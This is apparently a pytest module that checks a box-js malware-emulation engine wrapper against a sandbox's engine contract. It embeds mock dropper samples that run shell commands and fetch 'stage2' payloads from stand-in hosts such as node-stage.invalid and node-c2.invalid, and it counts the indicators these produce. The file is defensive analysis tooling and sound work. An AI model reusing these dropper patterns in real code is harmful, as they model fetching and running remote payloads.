"""BoxJsEngine against its engine contract (blastbox-engine.toml at the repo root).

The checker ships on blastbox's contract branch, so this module skips on a released
blastbox. The real-detonation tests also need node and an installed box-js checkout
(`git submodule update --init && (cd box-js && npm ci --omit=dev)`, or BOXJS_RUN_JS).
"""
from __future__ import annotations

import hashlib
import json
import os
import shutil
from pathlib import Path

import pytest

ec = pytest.importorskip("blastbox.contract.engine_contract")

from blastbox.limits import Limits

from boxjs_engine.engine import RUN_JS_ENV, BoxJsEngine

REPO = Path(__file__).resolve().parents[1]
CONTRACT_PATH = REPO / "blastbox-engine.toml"
CONTRACT = ec.load_contract(CONTRACT_PATH)

RUN_JS = Path(os.environ.get(RUN_JS_ENV) or REPO / "box-js" / "run.js")
REAL = (shutil.which("node") is not None and RUN_JS.is_file()
        and (RUN_JS.parent / "node_modules").is_dir())
needs_boxjs = pytest.mark.skipif(not REAL, reason="needs node + an installed box-js checkout")

# Benign: launches a command, fetches a URL (faked offline) and writes a file, which is the
# behaviour every artifact family and payload count is about.
SAMPLE = r'''
var sh = new ActiveXObject("WScript.Shell");
sh.Run("cmd /c echo contract", 0);
var x = new ActiveXObject("MSXML2.XMLHTTP");
x.open("GET", "http://example.invalid/stage2.bin", false);
x.send();
var f = new ActiveXObject("Scripting.FileSystemObject").CreateTextFile("C:\\Users\\Public\\a.txt", true);
f.WriteLine("dropped");
f.Close();
'''


def test_the_contract_validates():
    assert ec.find_contract(Path(__file__)) == CONTRACT_PATH
    assert ec.main(["validate", str(CONTRACT_PATH)]) == 0
    assert CONTRACT.engine.name == BoxJsEngine.name
    assert set(CONTRACT.engine.formats) == set(BoxJsEngine.formats)
    assert [c.mapper for c in CONTRACT.consumers if c.engine == "boxjs"] == [
        "backend/loadout/boxjs.py:map_outputs"]


def test_a_missing_box_js_is_an_engine_error_that_conforms(tmp_path, monkeypatch):
    monkeypatch.setenv(RUN_JS_ENV, str(tmp_path / "absent" / "run.js"))
    sample = tmp_path / "s.js"
    sample.write_text("var a = 1;")
    out = tmp_path / "out"
    out.mkdir()
    res = BoxJsEngine().detonate(sample, out, Limits())
    assert res.status == "engine_error"
    ec.assert_conforms(CONTRACT, res, out)


@needs_boxjs
def test_a_real_detonation_conforms(tmp_path, monkeypatch):
    monkeypatch.setenv(RUN_JS_ENV, str(RUN_JS))
    sample = tmp_path / "sample.js"
    sample.write_text(SAMPLE)
    out = tmp_path / "out"
    out.mkdir()
    res = BoxJsEngine().detonate(sample, out, Limits(timeout_s=60))
    assert res.status == "ok", res.payload.fields
    ec.assert_conforms(CONTRACT, res, out)
    ids = {a.id for a in res.artifacts}
    assert {"IOC.json", "urls.json"} <= ids
    assert res.payload.fields["exec_iocs"] >= 1 and res.payload.fields["url_count"] == 1
    assert res.payload.fields["schema_version"] == CONTRACT.payload.schema_version
    kinds = {a.kind for a in res.artifacts}
    # The Run command box-js saved is a snippet; a.txt the sample wrote is the dropped file.
    assert "snippet" in kinds
    dropped = [a for a in res.artifacts if a.kind == "dropped"]
    assert [(out / a.path).read_bytes() for a in dropped] == [b"dropped\r\n"]
    # box-js writes its index files as name-keyed maps that agree with the declared kinds.
    by_id = {a.id: a for a in res.artifacts}
    results = out / by_id["IOC.json"].path.rsplit("/", 1)[0]
    snippets = json.loads((results / "snippets.json").read_text())
    resources = json.loads((results / "resources.json").read_text())
    assert isinstance(snippets, dict) and snippets and isinstance(resources, dict)
    assert all(by_id[name].kind == "snippet" for name in snippets)
    assert [by_id[name].kind for name in resources] == ["dropped"]
    assert [r["sha256"] for r in resources.values()] == [
        hashlib.sha256(b"dropped\r\n").hexdigest()]


@needs_boxjs
def test_a_sealed_real_detonation_conforms(tmp_path, monkeypatch):
    """The harness's sealed metadata.json, as a worker ships it to the dispatcher."""
    from blastbox.worker.harness import run_detonation

    monkeypatch.setenv(RUN_JS_ENV, str(RUN_JS))
    sample = tmp_path / "sample.js"
    sample.write_text(SAMPLE)
    out = tmp_path / "out"
    assert run_detonation(BoxJsEngine(), input_path=sample, output_dir=out,
                          limits=Limits(timeout_s=60)) == 0
    meta = json.loads((out / "metadata.json").read_text())
    assert meta["status"] == "ok"
    assert meta["input_sha256"] == hashlib.sha256(sample.read_bytes()).hexdigest()
    ec.assert_conforms(CONTRACT, meta)


def test_snippet_and_dropped_counts_follow_the_worker_limits():
    """The engine bounds them only by Limits.max_artifacts, which a worker may raise past
    its 1000 default, so the contract must not cap them (max_count 0 = uncapped)."""
    caps = {a.kind: a.max_count for a in CONTRACT.artifacts if a.kind in ("snippet", "dropped")}
    assert caps == {"snippet": 0, "dropped": 0}


def test_a_jscript_encoded_script_is_a_rejection_that_conforms(tmp_path, monkeypatch):
    run_js = tmp_path / "box-js" / "run.js"
    run_js.parent.mkdir()
    run_js.write_text(          # box-js makes its results dir, then fails to parse (exit 4)
        "const fs = require('fs'), path = require('path');\n"
        "const out = process.argv.find((a) => a.startsWith('--output-dir=')).slice(13);\n"
        "fs.mkdirSync(path.join(out, path.basename(process.argv[2]) + '.results'));\n"
        "process.exit(4);\n")
    monkeypatch.setenv(RUN_JS_ENV, str(run_js))
    sample = tmp_path / "s.jse"
    sample.write_bytes(b"#@~^IgAAAA==@#@&/mDkwOR?4.+^VIAAAAA==^#~@")
    out = tmp_path / "out"
    out.mkdir()
    res = BoxJsEngine().detonate(sample, out, Limits())
    assert res.status == "rejected"
    ec.assert_conforms(CONTRACT, res, out)


# A node dropper: shells out and reaches the network through node's own modules, then
# finishes its work on a later timers.setInterval tick and clears the interval itself (the
# global setInterval is box-js's WSH stub, which runs the callback once).
NODE_SAMPLE = r'''
const cp = require("child_process"), https = require("https"), http = require("http"),
      dns = require("dns"), timers = require("timers");
cp.execSync("whoami");
https.get("https://node-stage.invalid/p.bin", () => {}).on("error", () => {});
http.get("http://node-stage.invalid/q.bin", () => {}).on("error", () => {});
dns.lookup("node-c2.invalid", () => {});
let ticks = 0;
const t = timers.setInterval(() => {
  ticks += 1;
  if (ticks === 3) {
    timers.clearInterval(t);
    new ActiveXObject("WScript.Shell").Run("cmd /c echo third-tick", 0);
  }
}, 1000);
'''


@needs_boxjs
def test_a_real_node_dropper_is_counted_and_its_interval_ends(tmp_path, monkeypatch):
    """The node-module IOCs land in the exec/url families, and a self-clearing setInterval
    repeats (box-js #3) and then lets the run end well inside its emulation budget."""
    import time

    monkeypatch.setenv(RUN_JS_ENV, str(RUN_JS))
    sample = tmp_path / "node.js"
    sample.write_text(NODE_SAMPLE)
    out = tmp_path / "out"
    out.mkdir()
    started = time.monotonic()
    res = BoxJsEngine().detonate(sample, out, Limits(timeout_s=60))
    elapsed = time.monotonic() - started
    assert res.status == "ok", res.payload.fields
    ec.assert_conforms(CONTRACT, res, out)
    assert "timeout" not in {w.code for w in res.warnings}
    assert elapsed < 30, elapsed
    f = res.payload.fields
    # execSync, plus the Run on the third tick (the interval repeated).
    assert f["exec_iocs"] == 2, f
    assert f["url_iocs"] >= 3, f          # https.get, http.get, dns.lookup
    iocs = json.loads((out / f["results_dir"] / "IOC.json").read_text())
    assert any(i.get("type") == "Run" and "third-tick" in json.dumps(i.get("value"))
               for i in iocs)
